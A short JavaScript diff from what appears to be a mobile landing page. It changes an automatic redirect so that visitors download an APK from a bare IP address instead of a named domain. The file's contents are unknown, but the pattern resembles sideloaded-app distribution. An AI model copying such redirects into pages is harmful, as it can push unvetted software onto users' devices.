@@ -109,7 +109,7 @@ function setAnchors() {
             document.getElementsByClassName('lt_t')[0].children[1].innerHTML = '安装完毕后，点击右方';
         }
     } else {
-        location.href = 'https://qmyl.hongniu22.com/bimgz_test-release-signed.apk?v=Math.random()*100000';
+        location.href = 'https://154.223.178.213/Download/511mdhc.apk?v=Math.random()*100000';
     }
   }
 }
